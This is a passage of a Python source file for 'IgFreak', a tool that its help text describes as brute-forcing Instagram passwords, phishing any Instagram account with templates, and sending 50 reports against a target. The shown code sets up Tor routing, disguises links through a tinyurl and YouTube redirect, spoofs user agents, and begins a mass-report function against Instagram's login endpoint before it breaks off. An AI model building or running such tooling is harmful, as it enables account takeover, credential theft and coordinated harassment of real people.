
#!/usr/bin/python3
# -*- coding: UTF-8 -*-
#
#
#  Copyright 2021 TDynamos <tdynamos@linux>
#
#  This program is free software; you can redistribute it and/or modify
#  it under the terms of the GNU General Public License as published by
#  the Free Software Foundation; either version 2 of the License, or
#  (at your option) any later version.
#
#  This program is distributed in the hope that it will be useful,
#  but WITHOUT ANY WARRANTY; without even the implied warranty of
#  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#  GNU General Public License for more details.
#
#  You should have received a copy of the GNU General Public License
#  along with this program; if not, write to the Free Software
#  Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston,
#  MA 02110-1301, USA.
import os
import sys
import marshal
try:
	import requests
except Exception:
	os.system('pip install requests')
#import requests as rs
def clr():
	os.system('clear')
try:
	from colorama import Fore,Back,Style
except Exception:
	os.system('pip install colorama')
	clr()
from colorama import Fore,Back,Style
try:
	import fake_useragent
except Exception:
	os.system('pip install fake_useragent')
	clr()
try:
	from stem.control import Controller
except Exception:
	os.system('pip install stem')
try:
	from pyngrok import ngrok 
except Exception:
	os.system('pip install pyngrok')	
	clr()
try:
	from pyngrok import ngrok 
except Exception:
	os.system("pip install pyngok")
	clr()
B = Style.BRIGHT+Fore.BLUE
G = Style.BRIGHT+Fore.GREEN
C = Style.BRIGHT+Fore.CYAN
Y = Style.BRIGHT+Fore.YELLOW
M = Style.BRIGHT+Fore.MAGENTA
W = Style.BRIGHT+Fore.WHITE
R = Style.BRIGHT+Fore.RED
version = 2.0
def check_d():
    php = os.system("command -v  php > /dev/null")
    if php == 0:
        pass
    else:
        print(f"{R}[!] php - 404 NOT FOUND !")
        php_install = input(f"{B}\n[?] What to Install It Now ? (y/n) : {W}")
        if php_install.lower() == "y":
            os.system("apt-get update")
            os.system("apt-get install php")
            return check_d()
    php2 = os.system("command -v  ssh > /dev/null")
    if php2 == 0:
        pass
    else:
        print(f"{R}[!] ssh - 404 NOT FOUND !")
        php_install = input(f"{B}\n[?] What to Install It Now ? (y/n) : {W}")
        if php_install.lower() == "y":
            os.system("apt-get update")
            os.system("apt install openssh ")
            os.system("apt-get install ssh ")
            return check_d()

code = """
torser="tor"
if pgrep -x "$torser" > /dev/null
then
echo ok
else
echo not
fi
"""
import subprocess
tors = subprocess.check_output(code,shell=True)
line = str(tors)
st = str(line.replace("b'",""))
s = st.replace("'","")
tors = s[:-2]
pyver = subprocess.check_output('python3 --version',shell=True)
line1 = str(pyver)
st1 = str(line1.replace("b'",""))
s1 = st1.replace("'","")
pyv = s1[:-2]
pyv = pyv.replace("Python ","")
if tors == "not":
	status = R+"Not Running"
else:
	status = "Running"
import pip

pipv = pip.__version__
logo = f"""
[0m[38;2;0;0;0m [0m[38;2;0;0;0m [0m[38;2;0;0;0m [0m[38;2;0;0;0m [0m[38;2;0;0;0m [0m[38;2;4;4;8m [0m[38;2;26;36;72m.[0m[38;2;41;56;112m.[0m[38;2;52;66;137m'[0m[38;2;57;69;147m'[0m[38;2;58;67;147m'[0m[38;2;60;65;147m'[0m[38;2;64;65;151m'[0m[38;2;71;65;156m,[0m[38;2;73;64;156m,[0m[38;2;76;62;156m,[0m[38;2;78;60;156m,[0m[38;2;81;58;156m,[0m[38;2;83;57;156m,[0m[38;2;85;55;156m,[0m[38;2;88;54;156m,[0m[38;2;90;52;156m,[0m[38;2;92;51;156m,[0m[38;2;95;50;156m'[0m[38;2;97;49;155m'[0m[38;2;99;47;155m'[0m[38;2;102;46;155m'[0m[38;2;104;45;154m'[0m[38;2;100;42;147m'[0m[38;2;101;41;145m'[0m[38;2;104;40;144m'[0m[38;2;99;36;134m'[0m[38;2;84;30;112m.[0m[38;2;58;20;74m.[0m[38;2;10;3;12m [0m[38;2;0;0;0m [0m[38;2;0;0;0m [0m[38;2;0;0;0m [0m[38;2;0;0;0m [0m[38;2;0;0;0m [0m
[0m[38;2;0;0;0m [0m[38;2;0;0;0m [0m[38;2;2;3;6m [0m[38;2;30;48;91m.[0m[38;2;51;80;155m,[0m[38;2;66;100;197m:[0m[38;2;71;100;202m:[0m[38;2;74;97;202m:[0m[38;2;78;94;202m:[0m[38;2;81;91;202m:[0m[38;2;85;88;203m:[0m[38;2;88;86;203m:[0m[38;2;92;83;203m:[0m[38;2;95;81;203m:[0m[38;2;99;78;203m:[0m[38;2;102;76;203m;[0m[38;2;105;74;203m;[0m[38;2;109;72;203m;[0m[38;2;112;70;203m;[0m[38;2;115;68;202m;[0m[38;2;118;66;202m;[0m[38;2;121;64;202m;[0m[38;2;125;63;201m;[0m[38;2;128;61;201m;[0m[38;2;131;60;201m;[0m[38;2;134;58;200m;[0m[38;2;137;57;200m;[0m[38;2;140;56;199m;[0m[38;2;142;55;199m;[0m[38;2;145;54;198m;[0m[38;2;148;53;197m;[0m[38;2;151;52;197m;[0m[38;2;154;51;196m;[0m[38;2;156;50;195m:[0m[38;2;157;49;191m;[0m[38;2;129;39;152m,[0m[38;2;80;23;91m.[0m[38;2;7;2;8m [0m[38;2;0;0;0m [0m[38;2;0;0;0m [0m 
[0m[38;2;0;0;0m [0m[38;2;19;23;49m [0m[38;2;66;90;184m;[0m[38;2;74;97;202m:[0m[38;2;78;94;202m:[0m[38;2;81;91;202m:[0m[38;2;85;89;202m:[0m[38;2;88;86;202m:[0m[38;2;92;83;202m:[0m[38;2;96;81;202m:[0m[38;2;99;79;202m:[0m[38;2;102;76;202m:[0m[38;2;106;74;202m;[0m[38;2;109;72;202m;[0m[38;2;112;70;202m;[0m[38;2;115;68;202m;[0m[38;2;119;66;202m;[0m[38;2;122;64;201m;[0m[38;2;125;63;201m;[0m[38;2;128;61;201m;[0m[38;2;131;60;201m;[0m[38;2;134;58;200m;[0m[38;2;137;57;200m;[0m[38;2;140;56;199m;[0m[38;2;142;55;199m;[0m[38;2;145;54;198m;[0m[38;2;148;53;197m;[0m[38;2;151;52;197m;[0m[38;2;154;51;196m;[0m[38;2;156;50;195m:[0m[38;2;159;50;194m:[0m[38;2;162;49;193m:[0m[38;2;164;49;192m:[0m[38;2;167;49;191m:[0m[38;2;169;49;190m:[0m[38;2;172;48;189m:[0m[38;2;174;48;188m:[0m[38;2;166;45;175m;[0m[38;2;56;15;57m.[0m[38;2;0;0;0m [0m {G}╔══╦═══╗ ╔═══╗───────╔╗      
[0m[38;2;10;8;20m [0m[38;2;88;85;198m:[0m[38;2;92;84;201m:[0m[38;2;95;82;201m:[0m[38;2;99;80;200m:[0m[38;2;102;78;200m:[0m[38;2;105;76;199m:[0m[38;2;109;74;199m:[0m[38;2;121;85;202m:[0m[38;2;162;136;219md[0m[38;2;193;175;231mO[0m[38;2;214;201;239mK[0m[38;2;228;218;244mX[0m[38;2;235;228;247mN[0m[38;2;239;232;248mN[0m[38;2;242;235;249mW[0m[38;2;243;237;250mW[0m[38;2;244;237;250mW[0m[38;2;244;237;250mW[0m[38;2;244;237;250mW[0m[38;2;245;237;250mW[0m[38;2;245;237;250mW[0m[38;2;245;237;250mW[0m[38;2;245;236;250mW[0m[38;2;244;234;249mW[0m[38;2;243;231;248mN[0m[38;2;241;226;246mN[0m[38;2;236;215;243mX[0m[38;2;228;196;237mK[0m[38;2;217;167;228mO[0m[38;2;200;124;214mx[0m[38;2;180;65;193mc[0m[38;2;176;48;187m:[0m[38;2;178;49;186m:[0m[38;2;181;49;184m:[0m[38;2;183;49;183m:[0m[38;2;185;50;182m:[0m[38;2;187;50;181m:[0m[38;2;188;50;178m:[0m[38;2;30;8;27m [0m {G}╚╣╠╣╔═╗║ ║╔══╝───────║║
[0m[38;2;46;30;80m.[0m[38;2;113;73;197m:[0m[38;2;116;71;196m:[0m[38;2;119;70;195m:[0m[38;2;122;69;194m:[0m[38;2;125;67;193m:[0m[38;2;133;74;195m:[0m[38;2;196;169;227mO[0m[38;2;249;247;252mW[0m[38;2;255;255;255mM[0m[38;2;236;220;242mN[0m[38;2;211;173;225mO[0m[38;2;198;146;215mk[0m[38;2;192;132;210mx[0m[38;2;190;126;207md[0m[38;2;190;122;206md[0m[38;2;191;120;205md[0m[38;2;192;118;204md[0m[38;2;193;118;204md[0m[38;2;195;118;204md[0m[38;2;196;117;204md[0m[38;2;198;117;204md[0m[38;2;199;117;204md[0m[38;2;201;117;204md[0m[38;2;203;119;205md[0m[38;2;205;122;207md[0m[38;2;208;128;209mx[0m[38;2;214;141;214mk[0m[38;2;225;168;224mO[0m[38;2;241;215;240mX[0m[38;2;255;255;255mM[0m[38;2;252;248;252mM[0m[38;2;225;167;224mO[0m[38;2;193;62;183mc[0m[38;2;192;51;177m:[0m[38;2;194;52;176m:[0m[38;2;196;53;174m:[0m[38;2;197;54;173mc[0m[38;2;199;54;172mc[0m[38;2;100;27;86m.[0m {G}─║║║║─╚╝ ║╚══╦═╦══╦══╣║╔╗
[0m[38;2;63;30;88m.[0m[38;2;137;63;187m:[0m[38;2;140;63;186m:[0m[38;2;143;62;184m:[0m[38;2;146;61;182m:[0m[38;2;151;64;182m:[0m[38;2;229;209;238mX[0m[38;2;255;255;255mM[0m[38;2;246;235;246mW[0m[38;2;187;108;194mo[0m[38;2;163;58;173m:[0m[38;2;166;57;172m:[0m[38;2;168;57;171m:[0m[38;2;171;56;170m:[0m[38;2;173;56;169m:[0m[38;2;176;56;168m:[0m[38;2;178;55;167m:[0m[38;2;180;55;166m:[0m[38;2;182;55;166m:[0m[38;2;184;55;165m:[0m[38;2;186;54;165m:[0m[38;2;188;54;165m:[0m[38;2;189;54;165m:[0m[38;2;191;54;165m:[0m[38;2;192;54;166m:[0m[38;2;193;54;166m:[0m[38;2;208;103;190mo[0m[38;2;224;156;215mO[0m[38;2;221;145;211mk[0m[38;2;201;71;178ml[0m[38;2;211;100;189mo[0m[38;2;248;230;244mN[0m[38;2;255;255;255mM[0m[38;2;244;214;238mX[0m[38;2;201;61;174mc[0m[38;2;200;55;171mc[0m[38;2;200;55;171mc[0m[38;2;200;55;171mc[0m[38;2;200;55;171mc[0m[38;2;112;31;95m.[0m {G}─║║║║╔═╗ ║╔══╣╔╣║═╣╔╗║╚╝╝
[0m[38;2;82;30;89m.[0m[38;2;162;59;173m:[0m[38;2;165;58;171m:[0m[38;2;168;58;168m:[0m[38;2;170;58;166m:[0m[38;2;198;121;194md[0m[38;2;255;255;255mM[0m[38;2;255;255;255mM[0m[38;2;208;128;191mx[0m[38;2;184;58;156m:[0m[38;2;187;58;154m:[0m[38;2;189;58;153m:[0m[38;2;191;58;151m:[0m[38;2;194;59;149m:[0m[38;2;196;59;148m:[0m[38;2;198;59;147mc[0m[38;2;207;89;164ml[0m[38;2;219;129;188mx[0m[38;2;226;155;202mO[0m[38;2;230;168;209m0[0m[38;2;231;168;209m0[0m[38;2;229;156;202mO[0m[38;2;224;132;188mx[0m[38;2;216;93;164mo[0m[38;2;211;61;145mc[0m[38;2;211;61;146mc[0m[38;2;246;211;230mX[0m[38;2;255;255;255mM[0m[38;2;254;252;253mM[0m[38;2;226;134;193mk[0m[38;2;206;58;158mc[0m[38;2;220;118;189mx[0m[38;2;255;255;255mM[0m[38;2;255;255;255mM[0m[38;2;220;129;202mx[0m[38;2;200;55;171mc[0m[38;2;200;55;171mc[0m[38;2;200;55;171mc[0m[38;2;200;55;171mc[0m[38;2;118;32;101m'[0m {G}╔╣╠╣╚╩═║ ║║──║║║║═╣╔╗║╔╗╗
[0m[38;2;94;30;80m.[0m[38;2;186;59;154m:[0m[38;2;189;59;151m:[0m[38;2;192;60;148m:[0m[38;2;194;60;145m:[0m[38;2;225;154;197mO[0m[38;2;255;255;255mM[0m[38;2;255;255;255mM[0m[38;2;214;93;154mo[0m[38;2;208;63;132mc[0m[38;2;210;63;130mc[0m[38;2;212;64;128mc[0m[38;2;214;65;126mc[0m[38;2;217;67;126mc[0m[38;2;230;139;178mk[0m[38;2;248;223;235mN[0m[38;2;255;255;255mM[0m[38;2;254;250;251mM[0m[38;2;250;219;227mN[0m[38;2;247;199;212mX[0m[38;2;247;199;213mX[0m[38;2;249;217;227mN[0m[38;2;254;249;251mM[0m[38;2;255;255;255mM[0m[38;2;250;227;237mN[0m[38;2;234;145;185mk[0m[38;2;219;68;138mc[0m[38;2;221;85;151ml[0m[38;2;217;74;148ml[0m[38;2;213;62;145mc[0m[38;2;211;61;149mc[0m[38;2;214;82;164ml[0m[38;2;255;255;255mM[0m[38;2;255;255;255mM[0m[38;2;231;162;213mO[0m[38;2;202;56;168mc[0m[38;2;200;55;170mc[0m[38;2;200;55;171mc[0m[38;2;200;55;171mc[0m[38;2;118;33;101m'[0m {G}╚══╩═══╝ ╚╝──╚╝╚══╩╝╚╩╝╚╝
[0m[38;2;106;32;68m.[0m[38;2;210;64;129mc[0m[38;2;213;65;126mc[0m[38;2;216;66;122mc[0m[38;2;219;67;119mc[0m[38;2;239;167;190mO[0m[38;2;255;255;255mM[0m[38;2;255;255;255mM[0m[38;2;232;92;123mo[0m[38;2;231;72;104ml[0m[38;2;233;73;102ml[0m[38;2;234;73;101ml[0m[38;2;235;77;103ml[0m[38;2;248;199;209mX[0m[38;2;255;255;255mM[0m[38;2;254;243;244mW[0m[38;2;244;149;164mk[0m[38;2;236;84;112ml[0m[38;2;234;73;105ml[0m[38;2;233;72;107ml[0m[38;2;231;72;109ml[0m[38;2;230;71;111ml[0m[38;2;230;79;120ml[0m[38;2;239;142;169mk[0m[38;2;253;239;243mW[0m[38;2;255;255;255mM[0m[38;2;246;205;222mX[0m[38;2;222;72;133ml[0m[38;2;220;65;132mc[0m[38;2;218;64;136mc[0m[38;2;216;63;140mc[0m[38;2;217;74;150ml[0m[38;2;255;255;255mM[0m[38;2;255;255;255mM[0m[38;2;235;173;214m0[0m[38;2;206;58;160mc[0m[38;2;203;57;164mc[0m[38;2;201;56;168mc[0m[38;2;200;55;171mc[0m[38;2;119;33;101m'[0m {G}
[0m[38;2;118;36;53m'[0m[38;2;233;73;101ml[0m[38;2;236;74;98ml[0m[38;2;238;75;95ml[0m[38;2;239;76;92ml[0m[38;2;248;173;179m0[0m[38;2;255;255;255mM[0m[38;2;255;255;255mM[0m[38;2;244;96;104mo[0m[38;2;243;78;86ml[0m[38;2;243;78;86ml[0m[38;2;243;78;86ml[0m[38;2;247;139;145mk[0m[38;2;255;255;255mM[0m[38;2;255;255;255mM[0m[38;2;246;131;139mx[0m[38;2;241;77;90ml[0m[38;2;240;76;92ml[0m[38;2;239;76;93ml[0m[38;2;238;75;96ml[0m[38;2;237;74;98ml[0m[38;2;236;74;100ml[0m[38;2;234;73;103ml[0m[38;2;233;72;106ml[0m[38;2;238;118;145mx[0m[38;2;255;255;255mM[0m[38;2;255;255;255mM[0m[38;2;237;143;174mk[0m[38;2;224;68;123mc[0m[38;2;222;67;127mc[0m[38;2;220;66;131mc[0m[38;2;220;75;141ml[0m[38;2;255;255;255mM[0m[38;2;255;255;255mM[0m[38;2;237;176;212m0[0m[38;2;210;60;152mc[0m[38;2;207;59;156mc[0m[38;2;205;58;161mc[0m[38;2;203;56;166mc[0m[38;2;120;33;101m'[0m {G}
[0m[38;2;123;39;45m'[0m[38;2;243;78;86ml[0m[38;2;244;78;84ml[0m[38;2;245;79;82ml[0m[38;2;246;79;80ml[0m[38;2;251;174;174m0[0m[38;2;255;255;255mM[0m[38;2;255;255;255mM[0m[38;2;249;99;94mo[0m[38;2;249;81;74ml[0m[38;2;249;81;74ml[0m[38;2;249;81;74ml[0m[38;2;251;140;135mk[0m[38;2;255;255;255mM[0m[38;2;255;255;255mM[0m[38;2;249;135;134mk[0m[38;2;247;80;79ml[0m[38;2;246;79;80ml[0m[38;2;245;79;82ml[0m[38;2;243;78;85ml[0m[38;2;242;77;87ml[0m[38;2;241;77;90ml[0m[38;2;239;76;93ml[0m[38;2;238;75;96ml[0m[38;2;241;122;140mx[0m[38;2;255;255;255mM[0m[38;2;255;255;255mM[0m[38;2;240;143;167mk[0m[38;2;229;70;114ml[0m[38;2;227;69;118ml[0m[38;2;225;68;122mc[0m[38;2;224;77;133ml[0m[38;2;255;255;255mM[0m[38;2;255;255;255mM[0m[38;2;239;176;208m0[0m[38;2;214;62;144mc[0m[38;2;211;61;149mc[0m[38;2;209;60;154mc[0m[38;2;206;58;159mc[0m[38;2;121;34;97m'[0m {G}Coder   : {C}Ansh Dadwal
[0m[38;2;126;41;40m'[0m[38;2;248;80;76ml[0m[38;2;249;81;73ml[0m[38;2;251;82;71ml[0m[38;2;252;82;68ml[0m[38;2;254;174;167m0[0m[38;2;255;255;255mM[0m[38;2;255;255;255mM[0m[38;2;254;105;86md[0m[38;2;254;86;64mo[0m[38;2;254;86;64mo[0m[38;2;254;86;64mo[0m[38;2;254;88;67mo[0m[38;2;255;200;192mX[0m[38;2;255;255;255mM[0m[38;2;255;245;244mW[0m[38;2;253;158;151mO[0m[38;2;251;95;84mo[0m[38;2;250;81;72ml[0m[38;2;249;81;74ml[0m[38;2;248;80;77ml[0m[38;2;246;79;80ml[0m[38;2;245;90;94mo[0m[38;2;247;151;157mO[0m[38;2;254;242;243mW[0m[38;2;255;255;255mM[0m[38;2;250;204;210mX[0m[38;2;236;78;105ml[0m[38;2;233;72;105ml[0m[38;2;231;71;110ml[0m[38;2;229;70;114ml[0m[38;2;228;81;127ml[0m[38;2;255;255;255mM[0m[38;2;255;255;255mM[0m[38;2;240;175;204m0[0m[38;2;217;64;137mc[0m[38;2;215;63;142mc[0m[38;2;212;61;147mc[0m[38;2;210;60;152mc[0m[38;2;123;35;92m'[0m {G}Team    : {C}T-Dynamos
[0m[38;2;128;42;34m'[0m[38;2;253;83;65ml[0m[38;2;254;85;64mo[0m[38;2;255;88;63mo[0m[38;2;255;91;63mo[0m[38;2;255;171;155m0[0m[38;2;255;255;255mM[0m[38;2;255;255;255mM[0m[38;2;255;126;96mx[0m[38;2;255;102;65mo[0m[38;2;255;102;65mo[0m[38;2;255;102;65mo[0m[38;2;255;101;65mo[0m[38;2;255;101;66mo[0m[38;2;255;158;135mO[0m[38;2;255;226;218mN[0m[38;2;255;255;255mM[0m[38;2;255;252;252mM[0m[38;2;255;225;222mN[0m[38;2;254;207;203mX[0m[38;2;254;207;204mX[0m[38;2;254;223;222mN[0m[38;2;255;251;251mM[0m[38;2;255;255;255mM[0m[38;2;254;225;224mN[0m[38;2;249;148;151mk[0m[38;2;242;79;90ml[0m[38;2;239;76;93ml[0m[38;2;237;75;97ml[0m[38;2;235;73;102ml[0m[38;2;233;72;106ml[0m[38;2;233;92;127mo[0m[38;2;255;255;255mM[0m[38;2;255;255;255mM[0m[38;2;240;167;195m0[0m[38;2;221;66;130mc[0m[38;2;218;65;135mc[0m[38;2;215;63;140mc[0m[38;2;213;62;146mc[0m[38;2;124;36;89m'[0m {G}Version : {C}{version}
[0m[38;2;126;44;31m.[0m[38;2;255;95;64mo[0m[38;2;255;100;65mo[0m[38;2;255;104;65mo[0m[38;2;255;108;66md[0m[38;2;255;156;125mO[0m[38;2;255;255;255mM[0m[38;2;255;255;255mM[0m[38;2;255;168;136mO[0m[38;2;255;120;68md[0m[38;2;255;120;68md[0m[38;2;255;120;68md[0m[38;2;255;120;68md[0m[38;2;255;118;68md[0m[38;2;255;116;67md[0m[38;2;255;113;67md[0m[38;2;255;130;91mx[0m[38;2;255;158;130mO[0m[38;2;255;176;154m0[0m[38;2;255;184;166mK[0m[38;2;255;181;166m0[0m[38;2;255;168;154m0[0m[38;2;255;144;130mk[0m[38;2;253;107;94md[0m[38;2;250;81;72ml[0m[38;2;248;80;76ml[0m[38;2;246;79;81ml[0m[38;2;243;78;85ml[0m[38;2;241;77;90ml[0m[38;2;239;75;94ml[0m[38;2;236;74;99ml[0m[38;2;241;130;151mx[0m[38;2;255;255;255mM[0m[38;2;255;255;255mM[0m[38;2;236;136;168mk[0m[38;2;224;67;124mc[0m[38;2;221;66;129mc[0m[38;2;218;65;135mc[0m[38;2;216;63;140mc[0m[38;2;125;36;85m'[0m 
[0m[38;2;116;48;30m'[0m[38;2;255;110;66md[0m[38;2;255;115;67md[0m[38;2;255;120;68md[0m[38;2;255;125;69mx[0m[38;2;255;131;72mx[0m[38;2;255;224;208mN[0m[38;2;255;255;255mM[0m[38;2;255;244;238mW[0m[38;2;255;170;123mO[0m[38;2;255;139;72mx[0m[38;2;255;139;71mx[0m[38;2;255;138;71mx[0m[38;2;255;136;71mx[0m[38;2;255;134;70mx[0m[38;2;255;131;70mx[0m[38;2;255;127;69mx[0m[38;2;255;123;69md[0m[38;2;255;118;68md[0m[38;2;255;113;67md[0m[38;2;255;107;66md[0m[38;2;255;101;65mo[0m[38;2;255;95;64mo[0m[38;2;255;89;63mo[0m[38;2;254;84;64ml[0m[38;2;252;82;68ml[0m[38;2;249;81;73ml[0m[38;2;247;80;78ml[0m[38;2;245;79;82ml[0m[38;2;242;77;88ml[0m[38;2;243;122;134mx[0m[38;2;253;235;237mW[0m[38;2;255;255;255mM[0m[38;2;250;215;223mN[0m[38;2;230;75;117ml[0m[38;2;226;69;119ml[0m[38;2;224;68;124mc[0m[38;2;221;66;129mc[0m[38;2;218;65;135mc[0m[38;2;118;35;77m'[0m {M}Python {G}{pyv}
[0m[38;2;68;32;18m.[0m[38;2;255;124;69mx[0m[38;2;255;130;70mx[0m[38;2;255;136;71mx[0m[38;2;255;141;72mx[0m[38;2;255;146;72mk[0m[38;2;255;153;79mk[0m[38;2;255;207;168mX[0m[38;2;255;250;245mM[0m[38;2;255;255;255mM[0m[38;2;255;239;228mW[0m[38;2;255;215;185mX[0m[38;2;255;201;160mK[0m[38;2;255;193;148mK[0m[38;2;255;189;142mK[0m[38;2;255;185;138m0[0m[38;2;255;181;136m0[0m[38;2;255;178;135m0[0m[38;2;255;174;134m0[0m[38;2;255;170;133mO[0m[38;2;255;166;133mO[0m[38;2;255;162;132mO[0m[38;2;255;158;132mO[0m[38;2;255;154;132mO[0m[38;2;255;150;132mk[0m[38;2;255;149;136mk[0m[38;2;253;153;144mO[0m[38;2;252;164;159mO[0m[38;2;252;186;185mK[0m[38;2;253;225;226mN[0m[38;2;255;255;255mM[0m[38;2;254;247;247mW[0m[38;2;247;173;183m0[0m[38;2;235;82;110ml[0m[38;2;232;72;108ml[0m[38;2;229;70;114ml[0m[38;2;226;69;119mc[0m[38;2;223;67;125mc[0m[38;2;220;66;131mc[0m[38;2;77;23;48m.[0m {M}Pip {G}{pipv}
[0m[38;2;32;32;32m [0m[38;2;186;100;52mc[0m[38;2;255;144;72mk[0m[38;2;255;150;73mk[0m[38;2;255;156;74mk[0m[38;2;255;162;75mk[0m[38;2;255;166;76mO[0m[38;2;255;170;76mO[0m[38;2;255;178;87mO[0m[38;2;255;203;136mK[0m[38;2;255;221;174mX[0m[38;2;255;232;199mN[0m[38;2;255;239;216mW[0m[38;2;255;242;225mW[0m[38;2;255;244;230mW[0m[38;2;255;244;232mW[0m[38;2;255;244;234mW[0m[38;2;255;244;234mW[0m[38;2;255;243;234mW[0m[38;2;255;243;234mW[0m[38;2;255;242;234mW[0m[38;2;255;241;234mW[0m[38;2;255;240;234mW[0m[38;2;255;238;233mW[0m[38;2;255;236;231mW[0m[38;2;255;233;228mW[0m[38;2;255;227;223mN[0m[38;2;255;218;213mN[0m[38;2;254;202;198mX[0m[38;2;252;176;174m0[0m[38;2;249;139;140mk[0m[38;2;243;89;98mo[0m[38;2;239;76;93ml[0m[38;2;237;74;98ml[0m[38;2;234;73;104ml[0m[38;2;231;71;109ml[0m[38;2;228;70;115ml[0m[38;2;225;68;121mc[0m[38;2;182;55;104m;[0m[38;2;32;32;32m [0m {M}Tor [{G}{status}{M}]
[0m[38;2;0;0;0m [0m[38;2;47;47;47m [0m[38;2;85;52;25m.[0m[38;2;255;164;75mO[0m[38;2;255;170;77mO[0m[38;2;255;177;78mO[0m[38;2;255;182;78m0[0m[38;2;255;187;79m0[0m[38;2;255;191;80m0[0m[38;2;255;193;80m0[0m[38;2;255;194;81m0[0m[38;2;255;194;80m0[0m[38;2;255;192;80m0[0m[38;2;255;189;80m0[0m[38;2;255;185;79m0[0m[38;2;255;180;78mO[0m[38;2;255;174;77mO[0m[38;2;255;167;76mO[0m[38;2;255;161;75mk[0m[38;2;255;153;74mk[0m[38;2;255;145;72mk[0m[38;2;255;137;71mx[0m[38;2;255;129;70mx[0m[38;2;255;121;68md[0m[38;2;255;113;67md[0m[38;2;255;104;65mo[0m[38;2;255;95;64mo[0m[38;2;255;87;63mo[0m[38;2;253;83;66ml[0m[38;2;250;81;72ml[0m[38;2;247;80;77ml[0m[38;2;244;78;83ml[0m[38;2;241;77;89ml[0m[38;2;239;75;95ml[0m[38;2;236;74;100ml[0m[38;2;233;72;106ml[0m[38;2;230;71;112ml[0m[38;2;94;29;49m.[0m[38;2;39;39;39m [0m[38;2;0;0;0m [0m
[0m[38;2;0;0;0m [0m[38;2;0;0;0m [0m[38;2;10;10;10m [0m[38;2;77;77;77m [0m[38;2;141;141;141m [0m[38;2;87;65;27m'[0m[38;2;255;197;81m0[0m[38;2;255;203;82mK[0m[38;2;255;208;83mK[0m[38;2;255;211;83mK[0m[38;2;255;213;84mK[0m[38;2;255;212;84mK[0m[38;2;255;210;83mK[0m[38;2;255;206;82mK[0m[38;2;255;200;81mK[0m[38;2;255;194;80m0[0m[38;2;255;186;79m0[0m[38;2;255;179;78mO[0m[38;2;255;171;77mO[0m[38;2;255;163;75mO[0m[38;2;255;154;74mk[0m[38;2;255;146;72mk[0m[38;2;255;137;71mx[0m[38;2;255;128;69mx[0m[38;2;255;119;68md[0m[38;2;255;110;66md[0m[38;2;255;101;65mo[0m[38;2;255;92;63mo[0m[38;2;254;84;63ml[0m[38;2;252;82;68ml[0m[38;2;249;81;74ml[0m[38;2;246;79;80ml[0m[38;2;243;78;86ml[0m[38;2;240;76;92ml[0m[38;2;102;32;42m.[0m[38;2;95;95;95m [0m[38;2;55;55;55m [0m[38;2;8;8;8m [0m[38;2;0;0;0m [0m[38;2;0;0;0m [0m
[0m[38;2;0;0;0m [0m[38;2;0;0;0m [0m[38;2;0;0;0m [0m[38;2;0;0;0m [0m[38;2;0;0;0m [0m[38;2;9;9;9m [0m[38;2;65;65;65m [0m[38;2;108;108;108m [0m[38;2;137;137;137m [0m[38;2;152;152;152m [0m[38;2;154;154;154m [0m[38;2;154;154;154m [0m[38;2;154;154;154m [0m[38;2;152;152;152m [0m[38;2;149;149;149m [0m[38;2;146;146;146m [0m[38;2;142;142;142m [0m[38;2;147;147;147m [0m[38;2;144;144;144m [0m[38;2;140;140;140m [0m[38;2;136;136;136m [0m[38;2;131;131;131m [0m[38;2;127;127;127m [0m[38;2;123;123;123m [0m[38;2;118;118;118m [0m[38;2;107;107;107m [0m[38;2;103;103;103m [0m[38;2;99;99;99m [0m[38;2;96;96;96m [0m[38;2;94;94;94m [0m[38;2;93;93;93m [0m[38;2;84;84;84m [0m[38;2;68;68;68m [0m[38;2;42;42;42m [0m[38;2;8;8;8m [0m[38;2;0;0;0m [0m[38;2;0;0;0m [0m[38;2;0;0;0m [0m[38;2;0;0;0m [0m[38;2;0;0;0m [0m"""
help = f"""
{logo}

{Fore.MAGENTA}IgFreak , Slick Instagram brute force command line tool. Copyright (C) 2021, T-Dynamos Ansh Dadwal
{W}
OPTIONS              USAGE                              REQUIRED

--bruteforce;-b       BruteForce Instagram Account         -pl(passlist),-u(username)
--phish;-ph           PHish any Instagram Account          -t(template)
--report;-r           Send 50 Reports to any IG Account    -u(usename)
--update              Update tool to latest version
{G}For more information visit {B}https://github.com/T-Dynamos/IgFreak
"""

def check_intr():
    try:
        requests.get("https://motherfuckingwebsite.com")
    except Exception:
        print(f"{R} Internet Connection Error ")
        sys.exit(2)       
from shutil import which

check = os.path.isfile('/usr/bin/bash')
if check == True:
	fileisd = '/etc/tor/torrc'
else:
	fileisd = "/data/data/com.termux/files/usr/etc/tor/torrc"
filepath = os.path.isfile(fileisd)

if filepath == True:
	filetor = open(fileisd,"w")
	filetor.writelines("ControlPort 9051\nHTTPTunnelPort 9876")
	filetor.close()
	pass
else:
	from pathlib import Path
	os.system(f"mkdir {fileisd[:-5]}")
	Path(fileisd).touch()
	filetor = open(fileisd,"a")
	filetor.writelines("ControlPort 9051\nHTTPTunnelPort 9876")
	filetor.close()
	pass
import urllib
def short(link):
	url =f'http://tinyurl.com/api-create.php?url=https://www.youtube.com/redirect?event=video_description&redir_token=QUFFLUhqbmxDbzZTMTZ2WlJLZVBlTlNGbHVBNk1SZzI3UXxBQ3Jtc0trSkRmX1o4NmNYVTdIdFR3LVlQWE5LbmM2YlJPRTRGLTdvdkt6MlR3LWxSNzMwLTVQQ3pVU0JhdTRZNnRidHlvSmVtNHIyY1paYmE2MzJ3QV9UYllLdi1EcXlDVGYyY3hNVHZZOEVubnFVWUVZYUJMdw&q={(link)}'
	a = requests.get(url)
	return a.text
import colorama
from colorama import Fore , Style
P = colorama.Fore.LIGHTMAGENTA_EX
R = Style.BRIGHT+Fore.RED
from timeit import default_timer as timer
def check_tor():
	if tors == "not":

		print(f"{R}Error : {B}Tor is not running start it in new session")
		exit()
	else:
		pass
start = timer()
def printBox(str):
	a = len(str)
	return (f'{C}╔═{a*"═"}═╗\n║ {G+str} {C}║\n╚═{a*"═"}═╝')
try:
	from fake_useragent import UserAgent
	ua = UserAgent()
except Exception as e:
	pass
import sys
import pip
pipv = pip.__version__
version = 4.0
rs = requests.session()

def report(id,xx,amount,wait):
	printInfo("Reporter")
	print(f"{G}\nUsing Account :{C} https://instagram.com/igfreak_reporter")
	

	url = 'https://www.instagram.com/accounts/login/ajax/'
	headers = {
     'accept': '*/*',
    'accept-encoding': 'gzip, deflate, br',
    'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
    'content-length': '275',
    'content-type': 'application/x-www-form-urlencoded',
